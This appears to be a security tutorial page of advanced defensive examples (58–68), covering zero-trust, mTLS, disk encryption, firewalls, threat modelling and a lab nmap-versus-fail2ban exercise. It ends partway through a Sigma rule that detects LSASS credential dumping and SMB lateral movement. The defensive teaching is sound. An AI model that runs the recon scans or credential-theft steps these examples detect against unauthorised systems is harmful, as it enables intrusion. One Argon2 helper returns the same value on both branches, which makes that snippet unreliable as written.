---
title: "Advanced"
weight: 10000003
date: 2026-05-21T00:00:00+07:00
draft: false
description: "IT security advanced examples — incident response, security architecture, and advanced threat mitigation (Examples 58–85)"
tags: ["it-security", "advanced", "by-example"]
---

## Example 58: Zero-Trust Network Architecture

**What this covers:** Zero-trust enforces "never trust, always verify" by authenticating every request regardless of network location. This example implements a BeyondCorp-style perimeter using iptables to drop unauthenticated traffic and nginx `auth_request` to delegate authorization to an identity-aware proxy.

**Scenario:** A company replaces its VPN with a zero-trust gateway. Internal services are unreachable without a valid identity token even from within the corporate network.

```bash
# iptables: default-deny all inbound, allow only the identity proxy port
iptables -P INPUT DROP                        # => Default policy: drop every packet
iptables -P FORWARD DROP                      # => No forwarding without explicit rule
iptables -A INPUT -i lo -j ACCEPT             # => Allow loopback (localhost)
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
                                              # => Allow return traffic for existing sessions
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
                                              # => Only HTTPS reaches the identity proxy
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
                                              # => SSH restricted to internal admin subnet only
iptables -A INPUT -p icmp -j DROP             # => Block ICMP to reduce network mapping exposure

# nginx auth_request configuration (nginx.conf snippet)
# auth_request delegates every request to /auth before serving content
```

```nginx
server {
    listen 443 ssl;
    server_name internal.example.com;         # => Protected internal service

    ssl_certificate     /etc/ssl/certs/server.crt;
    ssl_certificate_key /etc/ssl/private/server.key;
                                              # => mTLS optional; add ssl_verify_client on for full zero-trust

    location / {
        auth_request /auth;                   # => Every request validated before proxying
        auth_request_set $auth_status $upstream_status;
                                              # => Capture auth service HTTP status code
        error_page 401 = @error401;           # => Unauthenticated → redirect to login
        proxy_pass http://backend:8080;       # => Only reached after /auth returns 200
    }

    location = /auth {
        internal;                             # => Not directly accessible from outside
        proxy_pass http://identity-proxy:9000/validate;
                                              # => Identity-aware proxy checks JWT / session
        proxy_pass_request_body off;          # => Only headers forwarded; body not needed
        proxy_set_header Content-Length "";
        proxy_set_header X-Original-URI $request_uri;
                                              # => Forward original path for policy evaluation
    }

    location @error401 {
        return 302 https://login.example.com?next=$request_uri;
                                              # => Redirect unauthenticated users to SSO login
    }
}
```

**Key Takeaway:** Zero-trust shifts the security boundary from the network edge to identity verification, making lateral movement after network entry ineffective.

**Why It Matters:** Traditional VPNs grant broad network access once a user connects. Zero-trust validates identity and device posture on every request, limiting blast radius when credentials are stolen. The `auth_request` pattern delegates authorization without embedding it in application code, enabling consistent policy enforcement across heterogeneous backends. This architecture supports remote work and multi-cloud deployments where network perimeters no longer exist.

---

## Example 59: Mutual TLS (mTLS) Configuration

**What this covers:** Mutual TLS requires both server and client to present valid X.509 certificates, providing cryptographic proof of identity for both parties. This example configures nginx to validate client certificates signed by an internal CA.

**Scenario:** A microservice mesh where service-to-service calls must be authenticated. Rogue services or SSRF attacks cannot reach protected APIs without a valid client certificate.

```nginx
# nginx mTLS server configuration
server {
    listen 8443 ssl;
    server_name api.internal.example.com;

    # Server certificate (standard TLS)
    ssl_certificate     /etc/ssl/server.crt;   # => Server identity presented to clients
    ssl_certificate_key /etc/ssl/server.key;

    # Client certificate validation
    ssl_client_certificate /etc/ssl/ca.crt;    # => Internal CA that signs all client certs
    ssl_verify_client on;                      # => Reject connections without valid client cert
    ssl_verify_depth 2;                        # => Allow intermediate CA in chain (depth ≤ 2)

    # TLS hardening
    ssl_protocols TLSv1.3;                     # => Only TLS 1.3; drop 1.0/1.1/1.2
    ssl_ciphers TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256;
                                               # => AEAD ciphers only; no CBC, no RC4

    location /api/ {
        # Expose verified client identity to upstream application
        proxy_set_header X-Client-CN $ssl_client_s_dn_cn;
                                               # => Common Name from client cert (e.g., "payment-service")
        proxy_set_header X-Client-Fingerprint $ssl_client_fingerprint;
                                               # => SHA-1 fingerprint for audit logging
        proxy_set_header X-Client-Verify $ssl_client_verify;
                                               # => "SUCCESS" when cert valid; upstream can assert
        proxy_pass http://api-backend:8080;
    }
}
```

```bash
# Generating client certificate signed by internal CA
# Step 1: Generate client private key
openssl genrsa -out client.key 4096           # => 4096-bit RSA key (never leaves service host)

# Step 2: Create certificate signing request
openssl req -new -key client.key \
  -subj "/CN=payment-service/O=internal" \
  -out client.csr                             # => CSR contains public key + identity fields

# Step 3: Internal CA signs the CSR
openssl x509 -req -in client.csr \
  -CA ca.crt -CAkey ca.key \
  -CAcreateserial \
  -days 365 \
  -out client.crt                             # => Signed cert valid 1 year; rotate via automation

# Step 4: Verify the signed cert against the CA
openssl verify -CAfile ca.crt client.crt      # => Output: client.crt: OK
```

**Key Takeaway:** mTLS eliminates password-based service authentication; a compromised service credential cannot be replayed without the corresponding private key.

**Why It Matters:** In microservice architectures, service-to-service trust is often enforced only by network policy, which fails under SSRF or container escape attacks. mTLS provides cryptographic identity that survives network compromise. Certificate rotation via short lifetimes (90 days or less) and automated issuance with tools like cert-manager reduces the window of exposure from stolen certificates.

---

## Example 60: Certificate Transparency Log Monitoring

**What this covers:** Certificate Transparency (CT) logs are public, append-only records of every TLS certificate issued by participating CAs. Monitoring these logs detects rogue certificates issued for your domain — an early signal of phishing infrastructure or CA compromise.

**Scenario:** A security team monitors CT logs for any new certificate issued for `*.example.com` so they can investigate and revoke unauthorized certificates before attackers use them.

```bash
#!/usr/bin/env bash
# ct-monitor.sh — Query crt.sh for new certificates issued in the last 24 hours

DOMAIN="example.com"
KNOWN_CERTS_FILE="/var/security/known-certs.txt"   # => Previously seen cert fingerprints
ALERT_EMAIL="security@example.com"

# Query crt.sh JSON API for all certificates matching the domain
curl -s "https://crt.sh/?q=%25.${DOMAIN}&output=json" \
  | jq -r '.[] | "\(.id) \(.not_before) \(.name_value) \(.issuer_name)"' \
  > /tmp/ct-raw.txt
# => Each line: cert_id, not_before_date, SAN names, issuer

# Filter certs issued in the last 24 hours
YESTERDAY=$(date -d "yesterday" +%Y-%m-%d 2>/dev/null || date -v-1d +%Y-%m-%d)
grep "$YESTERDAY\|$(date +%Y-%m-%d)" /tmp/ct-raw.txt > /tmp/ct-recent.txt
# => Narrows to certificates with not_before matching today or yesterday

# Find certificates not in our known list
comm -23 \
  <(awk '{print $1}' /tmp/ct-recent.txt | sort) \
  <(sort "$KNOWN_CERTS_FILE") \
  > /tmp/ct-new.txt
# => comm -23 outputs lines only in file1 (new cert IDs not previously seen)

NEW_COUNT=$(wc -l < /tmp/ct-new.txt)   # => Number of newly discovered certificates

if [ "$NEW_COUNT" -gt 0 ]; then
    echo "ALERT: $NEW_COUNT new certificate(s) for $DOMAIN" | \
      mail -s "[CT-MONITOR] New certs for $DOMAIN" "$ALERT_EMAIL"
    # => Sends alert with count; attach full details for review
    cat /tmp/ct-new.txt >> "$KNOWN_CERTS_FILE"
    # => Update known list so next run only alerts on truly new certs
fi

echo "CT scan complete. New certs: $NEW_COUNT"   # => Log summary for cron output
```

**Key Takeaway:** CT log monitoring is a free, near-real-time mechanism to detect unauthorized certificate issuance before attackers deploy phishing sites.

**Why It Matters:** Misissued certificates are a primary enabler of MITM attacks and phishing. CT logs make certificate issuance transparent, but organizations must actively monitor them. Automated alerting on new certificates enables rapid response — contacting the issuing CA to revoke a fraudulent certificate within hours, before any end user encounters it. Tools like Facebook's certificate transparency monitoring service and self-hosted ctwatch implement similar logic at scale.

---

## Example 61: Hardware Security Module Concepts

**What this covers:** A Hardware Security Module (HSM) stores cryptographic keys in tamper-resistant hardware, ensuring private keys never exist in plaintext outside the device. This example uses SoftHSM2 (a software HSM for testing) with the PKCS#11 interface to generate and sign data.

**Scenario:** A PKI system generates signing keys that must never be exportable. All signing operations happen inside the HSM; applications interact through the PKCS#11 API.

```bash
# Install SoftHSM2 (software-only HSM for development/testing)
# Production: use Thales Luna, AWS CloudHSM, or YubiHSM2

# Initialize a token slot (equivalent to inserting an HSM)
softhsm2-util --init-token --slot 0 \
  --label "signing-ca" \
  --pin 1234 --so-pin 5678
# => Creates token labeled "signing-ca" in slot 0
# => --pin is user PIN; --so-pin is Security Officer PIN for administration

# List available slots to confirm initialization
softhsm2-util --show-slots
# => Slot 0: Label=signing-ca, Initialized=yes, UserPinOk=yes

# Generate RSA key pair inside the HSM (key never leaves the device)
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
  --token-label "signing-ca" \
  --pin 1234 \
  --keypairgen \
  --key-type RSA:4096 \
  --id 01 \
  --label "ca-signing-key"
# => Key pair generated and stored in HSM slot
# => Private key object: CKA_SENSITIVE=true, CKA_EXTRACTABLE=false (cannot be exported)

# Sign data using the HSM-resident private key
echo "payload to sign" > /tmp/payload.txt

pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
  --token-label "signing-ca" \
  --pin 1234 \
  --sign \
  --id 01 \
  --mechanism RSA-PKCS-PSS \
  --input-file /tmp/payload.txt \
  --output-file /tmp/payload.sig
# => RSA-PSS signature produced; private key used but never exposed to OS memory

# Verify signature using exported public key (public key IS extractable)
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
  --token-label "signing-ca" \
  --read-object --type pubkey --id 01 \
  -o /tmp/ca-pubkey.der
# => Public key exported in DER format for verification

openssl dgst -verify /tmp/ca-pubkey.der \
  -keyform DER \
  -sigopt rsa_padding_mode:pss \
  -sha256 \
  -signature /tmp/payload.sig \
  /tmp/payload.txt
# => Output: Verified OK (signature valid; private key never touched by OpenSSL)
```

**Key Takeaway:** HSMs provide a hardware root of trust where private key material is generated and used inside tamper-resistant hardware, making key exfiltration physically impossible.

**Why It Matters:** Software-based key stores are vulnerable to memory dumping, disk image theft, and hypervisor attacks. HSMs provide FIPS 140-2/3 certified protection where even system administrators cannot extract private keys. This is mandatory for root CA keys, code-signing keys, and financial transaction keys. Cloud HSM services (AWS CloudHSM, Azure Dedicated HSM) bring HSM protection to cloud workloads without on-premises hardware management.

---

## Example 62: Key Derivation with Argon2

**What this covers:** Argon2 is the winner of the Password Hashing Competition and is designed to resist GPU and ASIC brute-force attacks through configurable memory hardness. This example demonstrates correct usage of `argon2-cffi` for password hashing and verification in Python.

**Scenario:** A web application stores user passwords. The security team mandates Argon2id with OWASP-recommended parameters to protect the password database if it is stolen.

```python
#!/usr/bin/env python3
# password_hashing.py — Production-grade password hashing with Argon2id

from argon2 import PasswordHasher        # => argon2-cffi library wraps libargon2
from argon2.exceptions import (
    VerifyMismatchError,                  # => Wrong password supplied
    VerificationError,                    # => Verification failed due to internal error
    InvalidHashError,                     # => Hash string is malformed
)

# Configure Argon2id with OWASP-recommended parameters (2023)
ph = PasswordHasher(
    time_cost=3,        # => Number of iterations (higher = slower = more resistant)
    memory_cost=65536,  # => Memory usage in KiB = 64 MiB (resists GPU attacks)
    parallelism=4,      # => Number of parallel threads (match to server CPU cores)
    hash_len=32,        # => Output hash length in bytes (256 bits)
    salt_len=16,        # => Salt length in bytes; generated fresh per hash call
    encoding="utf-8",   # => Input password encoding
)
# => Argon2id combines data-independent (Argon2i) and data-dependent (Argon2d) passes
# => This makes it resistant to both side-channel and GPU attacks simultaneously


def hash_password(plaintext: str) -> str:
    """Hash a password. Returns PHC string format for database storage."""
    hashed = ph.hash(plaintext)
    # => PHC format: $argon2id$v=19$m=65536,t=3,p=4$<salt_b64>$<hash_b64>
    # => Salt is randomly generated per call; no two hashes are the same
    return hashed


def verify_password(stored_hash: str, plaintext: str) -> bool:
    """Verify plaintext against stored hash. Raises on mismatch."""
    try:
        ph.verify(stored_hash, plaintext)
        # => Returns True if match; raises VerifyMismatchError if wrong password
        if ph.check_needs_rehash(stored_hash):
            # => True if stored hash was created with weaker parameters
            # => Trigger rehash on next successful login to upgrade silently
            return True  # caller should rehash and update DB
        return True
    except VerifyMismatchError:
        return False      # => Wrong password — return False, do NOT expose details
    except (VerificationError, InvalidHashError) as e:
        raise RuntimeError(f"Hash verification error: {e}") from e


# --- Demonstration ---
password = "correct-horse-battery-staple"   # => Example passphrase (NIST SP 800-63B)

stored = hash_password(password)
print(f"Stored hash: {stored}")
# => $argon2id$v=19$m=65536,t=3,p=4$<random_salt>$<derived_key>

result = verify_password(stored, password)
print(f"Verify correct: {result}")           # => True

result_wrong = verify_password(stored, "wrong-password")
print(f"Verify wrong:   {result_wrong}")     # => False (VerifyMismatchError caught)
```

**Key Takeaway:** Argon2id's memory hardness makes large-scale offline cracking economically infeasible even with specialized hardware.

**Why It Matters:** MD5 and SHA-256 without salting are cracked by GPU farms in hours. bcrypt improved this with computational cost but remains vulnerable to FPGA attacks. Argon2id's memory-hard design means cracking requires gigabytes of RAM per attempt, limiting parallelism on even the most expensive hardware. OWASP mandates Argon2id as the first-choice algorithm for new applications; `check_needs_rehash` enables seamless migration from legacy algorithms.

---

## Example 63: Full Disk Encryption with LUKS

**What this covers:** LUKS (Linux Unified Key Setup) is the standard Linux disk encryption layer. It provides authenticated encryption for entire block devices, protecting data when a device is powered off or stolen. This example demonstrates the format, open, and mount workflow.

**Scenario:** A developer workstation policy requires full disk encryption. An IT team provisions new machines with an encrypted `/data` partition for sensitive project files.

```bash
#!/usr/bin/env bash
# luks-setup.sh — Format and open a LUKS2 encrypted partition

DEVICE="/dev/sdb1"           # => Target block device (NEVER run on live system partition)
MAPPER_NAME="secure-data"    # => Name under /dev/mapper/ after opening
MOUNT_POINT="/mnt/secure"    # => Where filesystem will be mounted

# Step 1: Format the device with LUKS2 (the current standard; LUKS1 is legacy)
cryptsetup luksFormat \
  --type luks2 \
  --cipher aes-xts-plain64 \     # => AES in XTS mode — standard for disk encryption
  --key-size 512 \               # => 512-bit key = two 256-bit AES keys for XTS
  --hash sha512 \                # => SHA-512 for PBKDF key derivation
  --pbkdf argon2id \             # => Argon2id PBKDF (LUKS2 feature; resistant to GPU attack)
  --pbkdf-memory 524288 \        # => 512 MiB memory cost for key derivation
  --pbkdf-parallel 4 \           # => 4 threads during key derivation
  --iter-time 5000 \             # => Minimum milliseconds for PBKDF calibration
  "$DEVICE"
# => Prompts for passphrase twice; writes LUKS header at start of device
# => LUKS header stores: cipher, UUID, encrypted master key slots

# Step 2: Open (decrypt) the LUKS container
cryptsetup luksOpen "$DEVICE" "$MAPPER_NAME"
# => Prompts for passphrase; decrypts master key from key slot 0
# => Creates /dev/mapper/secure-data (transparent block device)

# Step 3: Create filesystem on the decrypted device
mkfs.ext4 -L "secure-data" /dev/mapper/"$MAPPER_NAME"
# => ext4 filesystem written to decrypted device; not visible on raw /dev/sdb1

# Step 4: Mount and use
mkdir -p "$MOUNT_POINT"
mount /dev/mapper/"$MAPPER_NAME" "$MOUNT_POINT"
echo "Mounted at $MOUNT_POINT"   # => Ready for use; all writes encrypted transparently

# --- Key management: add backup passphrase to slot 1 ---
cryptsetup luksAddKey "$DEVICE"
# => Prompts for existing key (slot 0), then new key for slot 1
# => LUKS supports up to 32 key slots; each decrypts the same master key

# --- Inspect LUKS header ---
cryptsetup luksDump "$DEVICE"
# => Shows: Version: 2, UUID, cipher: aes-xts-plain64, active key slots

# --- Secure close ---
umount "$MOUNT_POINT"
cryptsetup luksClose "$MAPPER_NAME"
# => Flushes writes, removes /dev/mapper/secure-data
# => Data on /dev/sdb1 is now ciphertext; unreadable without passphrase
```

**Key Takeaway:** LUKS2 with Argon2id key derivation makes brute-force attacks against a stolen disk computationally infeasible even with modern GPU hardware.

**Why It Matters:** Physical theft is a significant data breach vector, especially for laptops and external drives. LUKS encryption ensures that stolen media yields only ciphertext. The PBKDF (Argon2id in LUKS2) slows passphrase guessing by requiring memory-intensive computation per attempt. Combined with a strong passphrase, this provides protection that withstands state-level adversaries. Key slots enable IT key escrow without changing the master key.

---

## Example 64: Advanced nftables with Connection Tracking

**What this covers:** nftables is the modern Linux packet filtering framework replacing iptables, offering cleaner syntax, atomic rule updates, and built-in connection tracking. This example implements rate limiting, stateful connection tracking, and a basic port-knocking defense.

**Scenario:** A server running SSH must resist brute-force attacks and port scanning. nftables enforces rate limits and implements a three-port knock sequence before SSH becomes accessible.

```bash
# /etc/nftables.conf — Advanced nftables configuration

# Flush all existing rules atomically
nft flush ruleset

# Load the full configuration
nft -f /etc/nftables.conf
```

```nftables
#!/usr/sbin/nft -f
# nftables.conf

# Define a table for IPv4 and IPv6
table inet filter {

    # Set for tracking port-knock state per source IP
    set knock_stage1 {
        type ipv4_addr
        flags timeout               # => Entries expire automatically after timeout
        timeout 10s                 # => Must complete knock sequence within 10 seconds
    }

    set knock_stage2 {
        type ipv4_addr
        flags timeout
        timeout 10s
    }

    set ssh_allowed {
        type ipv4_addr
        flags timeout
        timeout 60s                 # => SSH access granted for 60 seconds after knock
    }

    chain input {
        type filter hook input priority 0; policy drop;
                                    # => Default-deny all inbound traffic

        # Allow established and related connections
        ct state established,related accept
                                    # => Connection tracking: allow return traffic
        ct state invalid drop       # => Drop invalid state packets (scan evasion)

        # Allow loopback
        iif lo accept               # => Localhost always permitted

        # ICMP (allow ping but rate-limit to prevent amplification)
        ip protocol icmp limit rate 10/second accept
                                    # => Max 10 ICMP packets/sec from any source

        # SSH rate limiting — allow only 4 new connections per minute
        tcp dport 22 ct state new limit rate 4/minute accept
                                    # => Brute-force protection: 4 attempts/min max
        tcp dport 22 ct state new drop
                                    # => Drop excess SSH connection attempts

        # Port knocking — Stage 1: knock port 7000
        tcp dport 7000 ct state new add @knock_stage1 { ip saddr }
                                    # => Record source IP in stage1 set; no accept

        # Port knocking — Stage 2: knock port 8000 (only if in stage1)
        tcp dport 8000 ct state new ip saddr @knock_stage1 \
            add @knock_stage2 { ip saddr }
                                    # => IP in stage1 → promote to stage2

        # Port knocking — Stage 3: knock port 9000 (only if in stage2)
        tcp dport 9000 ct state new ip saddr @knock_stage2 \
            add @ssh_allowed { ip saddr }
                                    # => Three-knock complete → add to ssh_allowed set

        # Allow SSH only from IPs that completed the knock sequence
        tcp dport 22 ip saddr @ssh_allowed accept
                                    # => SSH visible only to IPs in ssh_allowed

        # HTTP/HTTPS with per-IP connection limit
        tcp dport { 80, 443 } ct state new limit rate over 100/minute drop
                                    # => Drop IPs exceeding 100 new connections/minute
        tcp dport { 80, 443 } accept
    }

    chain forward {
        type filter hook forward priority 0; policy drop;
                                    # => No forwarding (not a router)
    }

    chain output {
        type filter hook output priority 0; policy accept;
                                    # => Outbound unrestricted (tighten in production)
    }
}
```

**Key Takeaway:** nftables connection tracking and rate-limiting provide stateful, performance-efficient defenses against brute-force and port-scan attacks with atomic rule updates.

**Why It Matters:** iptables accumulates rules linearly and lacks atomic updates, creating race conditions during rule changes. nftables evaluates rules in O(1) for set lookups, supports atomic `nft -f` reloads, and its connection-tracking integration enables stateful rate limiting that blocks brute-force SSH attacks while allowing legitimate users. Port knocking adds an obscurity layer that eliminates SSH exposure to internet-wide scanners.

---

## Example 65: STRIDE Threat Modeling

**What this covers:** STRIDE is a structured threat modeling methodology identifying six threat categories: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege. This example applies STRIDE to a web application and documents mitigations in a threat model table.

**Scenario:** A security architect performs a pre-launch threat model for a financial web application with a React frontend, Node.js API, and PostgreSQL database.

```markdown
# Threat Model: FinApp Web Application

# Date: 2026-05-21 | Version: 1.0

# Scope: Frontend → API Gateway → Node.js API → PostgreSQL

## System Components

- C1: React SPA (browser)
- C2: API Gateway (nginx + rate limiter)
- C3: Node.js REST API (Express)
- C4: PostgreSQL 16 (primary database)
- C5: Redis (session cache)
- C6: S3-compatible storage (document uploads)

## STRIDE Threat Analysis Table

| ID   | Stride Cat.            | Component | Threat Description                               | Mitigation                                            | Status    |
| ---- | ---------------------- | --------- | ------------------------------------------------ | ----------------------------------------------------- | --------- |
| T-01 | Spoofing               | C3        | Attacker forges JWT to access another user       | RS256 JWT, short expiry (15min), token rotation       | MITIGATED |
| T-02 | Spoofing               | C2        | DNS spoofing redirects users to phishing site    | DNSSEC, HSTS preload, CAA DNS record                  | MITIGATED |
| T-03 | Tampering              | C4        | SQL injection modifies financial records         | Parameterized queries only, least-privilege DB user   | MITIGATED |
| T-04 | Tampering              | C6        | Attacker replaces uploaded document with malware | S3 object lock (WORM), AV scan on upload, signed URLs | IN REVIEW |
| T-05 | Repudiation            | C3        | User denies performing financial transaction     | Append-only audit log, request signing, NTP sync      | MITIGATED |
| T-06 | Repudiation            | C2        | Log tampering to erase access records            | Remote syslog (write-only), SIEM ingestion            | MITIGATED |
| T-07 | Info Disclosure        | C3        | Stack traces expose internal paths in responses  | Production error handler returns generic 500 only     | MITIGATED |
| T-08 | Info Disclosure        | C4        | Database credentials in environment leak         | Secrets manager (Vault/AWS SM), no .env in repo       | MITIGATED |
| T-09 | Info Disclosure        | C1        | XSS exfiltrates session tokens                   | HttpOnly cookies, CSP header, input sanitization      | MITIGATED |
| T-10 | Denial of Service      | C2        | HTTP flood exhausts API capacity                 | nftables rate-limit, nginx limit_req, WAF             | MITIGATED |
| T-11 | Denial of Service      | C4        | Unbounded query exhausts DB connections          | Connection pool max, query timeout, slow query log    | IN REVIEW |
| T-12 | Elevation of Privilege | C3        | IDOR allows user to read other users' records    | Object-level authorization check per request          | OPEN      |
| T-13 | Elevation of Privilege | C3        | Mass assignment overwrites admin flag in body    | Allowlist of writable fields in request validator     | MITIGATED |

## Risk Priority (Open/In Review items)

# T-12 IDOR: HIGH — financial data exposure, fix before launch

# T-04 Document tampering: MEDIUM — object lock controls ordered

# T-11 DB DoS: MEDIUM — pgBouncer pool + statement_timeout in sprint
```

**Key Takeaway:** STRIDE forces systematic coverage of all threat categories rather than ad-hoc security review, ensuring teams don't miss entire classes of vulnerabilities.

**Why It Matters:** Most security reviews focus on injection and authentication, overlooking repudiation and denial-of-service threats. The STRIDE table creates an auditable artifact linking threats to controls, enabling compliance evidence, regression tracking, and risk prioritization. Threat models are most effective when maintained throughout the development lifecycle, not just at design time. The T-12 finding (IDOR) is a real-world leading cause of API data breaches.

---

## Example 66: Security Architecture Review Checklist

**What this covers:** A security architecture review validates that a system meets baseline security controls before deployment. This example implements a shell-based checklist that programmatically verifies common security configurations.

**Scenario:** A DevSecOps team runs an automated pre-deployment security gate that checks TLS configuration, HTTP headers, open ports, and dependency vulnerabilities.

```bash
#!/usr/bin/env bash
# security-arch-review.sh — Automated security architecture gate

TARGET_HOST="${1:-app.example.com}"   # => Hostname to review (passed as argument)
TARGET_PORT="${2:-443}"
PASS=0
FAIL=0

check() {
    local name="$1" result="$2" detail="$3"
    if [ "$result" = "PASS" ]; then
        echo "[PASS] $name"
        ((PASS++))
    else
        echo "[FAIL] $name — $detail"
        ((FAIL++))
    fi
}

echo "=== Security Architecture Review: $TARGET_HOST ==="

# Check 1: TLS version — must not accept TLS 1.0 or 1.1
TLS10=$(openssl s_client -connect "$TARGET_HOST:$TARGET_PORT" \
  -tls1 </dev/null 2>&1 | grep -c "Cipher is")
# => Returns 1 if server accepted TLS 1.0 handshake, 0 if rejected
check "TLS 1.0 disabled" \
  "$([ "$TLS10" -eq 0 ] && echo PASS || echo FAIL)" \
  "Server accepts TLS 1.0 — upgrade to TLS 1.2+ minimum"

# Check 2: HTTP Strict Transport Security header present
HSTS=$(curl -sI "https://$TARGET_HOST" | grep -ci "strict-transport-security")
check "HSTS header present" \
  "$([ "$HSTS" -ge 1 ] && echo PASS || echo FAIL)" \
  "Missing Strict-Transport-Security header"

# Check 3: Content-Security-Policy header present
CSP=$(curl -sI "https://$TARGET_HOST" | grep -ci "content-security-policy")
check "CSP header present" \
  "$([ "$CSP" -ge 1 ] && echo PASS || echo FAIL)" \
  "Missing Content-Security-Policy header — XSS risk"

# Check 4: X-Frame-Options or CSP frame-ancestors present
XFRAME=$(curl -sI "https://$TARGET_HOST" | grep -ci "x-frame-options")
check "Clickjacking protection" \
  "$([ "$XFRAME" -ge 1 ] && echo PASS || echo FAIL)" \
  "Missing X-Frame-Options or CSP frame-ancestors"

# Check 5: No server version disclosure
SERVER=$(curl -sI "https://$TARGET_HOST" | grep -i "^server:" | head -1)
NOVERSION=$(echo "$SERVER" | grep -cEv "(Apache/[0-9]|nginx/[0-9]|IIS/[0-9])")
check "Server version not disclosed" \
  "$([ "$NOVERSION" -ge 1 ] && echo PASS || echo FAIL)" \
  "Server header discloses version: $SERVER"

# Check 6: SSH not open on default port to internet
SSH_OPEN=$(timeout 3 bash -c "echo > /dev/tcp/$TARGET_HOST/22" 2>&1; echo $?)
check "SSH port 22 not exposed" \
  "$([ "$SSH_OPEN" -ne 0 ] && echo PASS || echo FAIL)" \
  "Port 22 is open on $TARGET_HOST — restrict to VPN/bastion"

# Check 7: Security.txt present (RFC 9116)
SECTXT=$(curl -so /dev/null -w "%{http_code}" "https://$TARGET_HOST/.well-known/security.txt")
check "security.txt present (RFC 9116)" \
  "$([ "$SECTXT" = "200" ] && echo PASS || echo FAIL)" \
  "No /.well-known/security.txt — security researchers have no contact path"

# Summary
echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
[ "$FAIL" -gt 0 ] && exit 1 || exit 0   # => Non-zero exit blocks deployment pipeline
```

**Key Takeaway:** Automated security architecture checklists enforce a consistent baseline and integrate into CI/CD pipelines as deployment gates.

**Why It Matters:** Manual architecture reviews are inconsistent and easily skipped under delivery pressure. A scripted checklist runs in seconds, produces auditable output, and can block deployments when critical controls are missing. Over time, the checklist evolves to cover new threat classes. Failures on TLS configuration and missing security headers are among the most commonly found and easily preventable issues in production systems.

---

## Example 67: Simulating an Attack and Defense

**What this covers:** Understanding attack-defense dynamics requires seeing both perspectives. This example runs a controlled nmap reconnaissance scan and demonstrates how fail2ban automatically detects and bans the scanning host based on log analysis.

**Scenario:** A security team runs a red/blue team exercise on a lab server. The red team scans for open ports; the blue team's fail2ban configuration automatically bans the scanner.

```bash
# === RED TEAM: Reconnaissance ===
# Run from attacker host (10.0.0.5) against target (10.0.0.10)

nmap -sV -sC -O -T4 10.0.0.10 2>&1 | head -30
# -sV: service version detection
# -sC: run default NSE scripts
# -O: OS fingerprinting
# -T4: aggressive timing (faster scan)
# => Generates dozens of connection attempts per second
# => These appear in /var/log/auth.log and nginx/apache logs on target

# === BLUE TEAM: Target server logs during scan ===
# /var/log/auth.log shows repeated SSH probe attempts:
# May 21 10:00:01 server sshd[1234]: Connection from 10.0.0.5 port 54321
# May 21 10:00:01 server sshd[1234]: Invalid user root from 10.0.0.5
# May 21 10:00:02 server sshd[1235]: Invalid user admin from 10.0.0.5
# => fail2ban monitors this log in real time

# fail2ban jail configuration (/etc/fail2ban/jail.d/ssh.conf):
```

```ini
[sshd]
enabled   = true
port      = ssh
filter    = sshd                        # => Uses /etc/fail2ban/filter.d/sshd.conf regex
logpath   = /var/log/auth.log
maxretry  = 3                           # => Ban after 3 failures within findtime window
findtime  = 600                         # => Count failures within 600-second (10-min) window
bantime   = 3600                        # => Ban for 1 hour (use -1 for permanent)
action    = iptables-multiport[name=SSH, port="ssh", protocol=tcp]
                                        # => Adds DROP rule to iptables for banned IP
```

```bash
# === BLUE TEAM: Verify fail2ban banned the scanner ===
fail2ban-client status sshd
# => Output:
# Status for the jail: sshd
# |- Filter: Currently failed: 1 | Total failed: 47 | File list: /var/log/auth.log
# `- Actions: Currently banned: 1 | Total banned: 1 | Banned IP list: 10.0.0.5
# => Scanner IP 10.0.0.5 automatically banned after 3 auth failures

# Verify iptables rule was added
iptables -L f2b-SSH -n --line-numbers
# => Chain f2b-SSH: DROP 10.0.0.5/32 (packets from scanner now silently dropped)

# Unban for further testing
fail2ban-client set sshd unbanip 10.0.0.5
# => Removes DROP rule; IP can connect again (useful for post-exercise cleanup)
```

**Key Takeaway:** Automated ban systems like fail2ban convert log events into firewall rules in near-real-time, transforming passive logging into active defense.

**Why It Matters:** Undefended SSH ports face continuous brute-force attacks from botnets. fail2ban reduces exposure by automatically banning source IPs after threshold failures, making dictionary attacks impractical. The attack simulation reveals what log patterns an attacker generates, enabling teams to tune detection thresholds and test that defenses respond correctly before real attackers probe production systems.

---

## Example 68: APT Detection with SIEM Correlation

**What this covers:** Advanced Persistent Threats (APTs) use multi-stage lateral movement that no single log event reveals. SIEM correlation rules stitch together events across time and hosts to detect attack chains. This example writes a Sigma detection rule for APT lateral movement.

**Scenario:** A threat intelligence team codifies detection for a known APT lateral movement pattern: credential dump followed by PsExec/SMB execution on a new host within a short time window.

```yaml
# sigma-apt-lateral-movement.yml
# Sigma rule: APT lateral movement via credential dump + remote execution
# Reference: MITRE ATT&CK T1003 (Credential Dumping) + T1021.002 (SMB/Windows Admin Shares)

title: APT Lateral Movement — Credential Dump Followed by SMB Execution
id: a7f3c1e2-4b5d-4f8e-9c2a-1d6e8f3b7a90 # => UUID for rule tracking
status: experimental # => Not yet validated in production
description: |
  Detects credential dumping (lsass access) followed within 5 minutes by
  SMB connection to a new host from the same source IP.
  Indicates likely APT lateral movement: dump creds → reuse on adjacent host.
author: security-team@example.com
date: 2026-05-21
tags:
  - attack.credential_access
  - attack.t1003 # => MITRE T1003: OS Credential Dumping
  - attack.lateral_movement
  - attack.t1021.002 # => MITRE T1021.002: SMB/Windows Admin Shares
  - detection.emerging_threats

# Rule type: correlation (requires SIEM supporting Sigma correlation rules)
type: correlation
rules:
  credential_dump: # => First event: lsass process access
    title: LSASS Memory Read
    logsource:
      category: process_access # => Windows Security Event 4656/4663
      product: windows
    detection:
      selection:
        TargetImage|endswith:
          '\lsass.exe'
          # => lsass.exe is the credential store process
        GrantedAccess|contains:
          - "0x1010" # => PROCESS_VM_READ — memory read access
          - "0x1410" # => Common mimikatz access mask
      condition: selection

  smb_new_host: # => Second event: SMB connection to new target
    title: SMB Connection to New Host
    logsource:
      category: network_connection
      product: windows
    detection:
      selection:
        DestinationPort: 445 # => SMB port — used by PsExec and WMI lateral movement
